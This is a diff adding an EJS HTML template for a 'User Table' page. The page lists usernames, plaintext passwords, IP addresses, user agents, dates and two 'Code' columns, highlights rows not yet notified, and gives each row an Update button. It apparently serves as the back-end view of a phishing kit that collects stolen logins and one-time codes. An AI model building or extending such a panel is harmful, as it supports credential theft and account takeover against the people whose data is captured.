@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+<style>
+.high{
+background-color:yellow;
+
+}
+</style>
+</head>
+<body>
+  <a href="/backend">Home</a><br><br>
+    <h1>User Table</h1>
+    <div>
+      <table border="2">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Ip</th>
+                <th>Useragent</th>
+                <th>Date</th>
+                <th>Code</th>
+                <th>Code2</th>
+                <th>Action</th>
+            
+            </tr>
+        </thead>
+        <tbody>
+          <% data.forEach(function(user) { %>
+            <tr <%if(user.notify == '0') {%> class="high"<%}%>  >
+                
+              <td><%= user.id %></td>
+              <form name="form" action='/req/update' method='POST'>
+              <td><input type="text" name="username" readonly="" value="<%= user.username %>"></td>
+              <td><%= user.password %></td>
+              <td><%= user.ip %></td>
+              <td><%= user.useragent %></td>
+              <td><%= user.date %></td>
+              <td><%= user.code %></td>
+              <td><%= user.code2 %></td>
+              <td><input type="submit" name="update" value="Update"></td></form>
+            </tr>
+          <% }); %>
+        </tbody>
+        
+    </table>
+</div>
+
+  
+   
+</body>
+</html>
